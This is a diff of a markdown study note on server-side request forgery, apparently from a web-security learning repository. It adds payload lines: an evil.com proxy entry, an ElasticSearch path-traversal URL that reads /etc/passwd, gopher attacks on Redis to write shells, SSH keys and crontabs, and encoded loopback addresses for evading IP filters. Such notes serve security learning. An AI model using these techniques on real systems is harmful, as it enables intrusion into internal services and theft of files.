@@ -3,7 +3,7 @@ Server Side Request Forge
 Bypass the firewall and grope through the intranet  
 
 ![ssrf](https://github.com/shinmao/Web-Security-Learning/blob/master/SSRF/screenshot/SSRF.png)  
-Find the vulnerable place > with Protocol > Apply to deeper attack > Bypass
+1. Find the vulnerable place > 2. with Protocol > 3. Apply to deeper attack > 4. Bypass
 
 # Find the vulnerable place
 **Controllable** URL parameter：url, src, imgURL, share, wap, link  
@@ -49,17 +49,66 @@ GET
 ...
 Proxy: http://evil.com/
 ```  
-hijack the http connection
+hijack the http connection  
+
+In addition to find the potential parameter, we also can set up a server or DNS logger. If we get request from the server side, there might be vul to SSRF somewhere.
 
 
 # with Protocol  
-![](https://farm2.staticflickr.com/1774/43295065584_6cfa758570_m.jpg)  
+![](https://farm2.staticflickr.com/1774/43295065584_6cfa758570_b.jpg)  
+gopher is an awesome protocol to attack intranet service  
+Jar is a protocol which can be used to create controllable temp file  
+FTP or SMB can also be used on bruteforce of password  
 
-# Apply to deeper attack
+# Apply to deeper attack  
+Attack service built in intranet  
+1. Struts2  
+  
+2. ElasticSearch - port:9200  
+CVE-2014-3120  
+CVE-2015-1427  
+CVE-2015-3337  
+```php
+http://example.com:9200/_plugin/head/../../../../../../etc/passwd
+```  
+  
+3. Neo4j, CouchDB, MongoDB  
+Visit API -> modify settings -> RCE  
+  
+4. Tomcat - port:8005  
+SSRF with gopher  
+  
+5. Zabbix - port:10050  
+SSRF with gopher  
+  
+6. Redis - port:6379  
+Write shell with gopher -> write SSH key with SAVE -> write crontab with SAVE -> SET to exploit again  
+
+7. FastCGI - port:9000  
+```php
+gopher://example.com:9000/....
+```
 
 # Bypass  
-Bypass DNS limit  
-Bypass ip limit
+I would check your schema, host, port  
+* Bypass DNS limit:  
+A special domain provider> `xip.io`  
+DNS rebinding: use Round-Robin to bypass  
+  
+* Bypass ip limit:  
+ip can be decimal, hexidecimal, or Octal  
+```php
+127.0.0.1
+127.0.1
+127.1
+0.0.0.0
+0.0
+0
+0x7f000001
+2130706433
+017700000001
+```  
+This tricks can be used to bypass wordpress protection on SSRF in CVE-2016-4029
 
 ## Reference
 * Orange Slides
